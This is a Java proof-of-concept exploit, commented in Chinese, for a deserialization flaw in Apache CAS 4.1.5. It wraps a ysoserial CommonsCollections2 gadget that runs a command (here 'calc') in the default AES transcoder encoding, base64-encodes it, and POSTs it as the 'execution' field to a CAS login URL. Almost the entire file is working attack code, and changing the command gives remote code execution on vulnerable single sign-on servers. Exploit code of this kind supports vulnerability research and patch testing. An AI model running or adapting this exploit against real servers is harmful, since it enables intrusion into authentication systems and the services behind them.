// 依赖CAS自带的包
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;
import org.jasig.spring.webflow.plugin.EncryptedTranscoder;
import org.cryptacular.util.CodecUtil;

// 依赖ysoserial
import ysoserial.payloads.ObjectPayload;

// 发起请求
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.Consts;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.ResponseHandler;
import org.apache.http.HttpEntity;

import java.util.ArrayList;
import java.util.List;

public class PoC{
    public static void main(String[] args) throws Exception{
        // 由于CAS的WEB-INF/lib下刚好有commons-collections包，所以可以使用ysoserial的CommonsCollections2这个gadget进行反序列化攻击
        String poc[] = {"CommonsCollections2", "calc"};
        final Object payloadObject = ObjectPayload.Utils.makePayloadObject(poc[0], poc[1]);

        // AES加密
        EncryptedTranscoder transcoder = new EncryptedTranscoder();
        byte[] aesEncoded = transcoder.encode(payloadObject);
        // base64加密
        String b64Encoded = CodecUtil.b64(aesEncoded);
        System.out.println(b64Encoded);

        // 使用一个已有的UUID与生成的payload构造成一个execution
        String exection = "81d2df90-90c4-4ae9-a48f-ad254bb43903_" + b64Encoded;

        // 通过HttpClient发送PoC
        sendPoC(exection);
    }

    /*
     * 实际上只需要提交这两个字段即可：
     * lt，execution
     * 参考：https://memorynotfound.com/apache-httpclient-html-form-post-example/
     */
    public static void sendPoC(String execution)throws Exception {


        List<NameValuePair> form = new ArrayList<>();
        form.add(new BasicNameValuePair("lt", "LT-1-nHNSOYJzpyCmngDyq9rl9TtS3rNQte-cas01.example.org"));
        form.add(new BasicNameValuePair("execution", execution));
        UrlEncodedFormEntity entity = new UrlEncodedFormEntity(form, Consts.UTF_8);


        // 构造HttpPost
        HttpPost httpPost = new HttpPost("http://cqq.com:8088/cas-server-webapp-4.1.5/login");
        httpPost.setEntity(entity);

        // 构造HTTP响应处理器
        ResponseHandler<String> responseHandler = response -> {
            int status = response.getStatusLine().getStatusCode();
            if (status >= 200 && status < 300) {
                HttpEntity responseEntity = response.getEntity();
                return responseEntity != null ? EntityUtils.toString(responseEntity) : null;
            } else {
                throw new ClientProtocolException("Unexpected response status: " + status);
            }
        };

        // 使用HttpClient执行POST方法
        CloseableHttpClient httpclient = HttpClients.createDefault();
        String responseBody = httpclient.execute(httpPost, responseHandler);
        System.out.println(responseBody);
    }
}
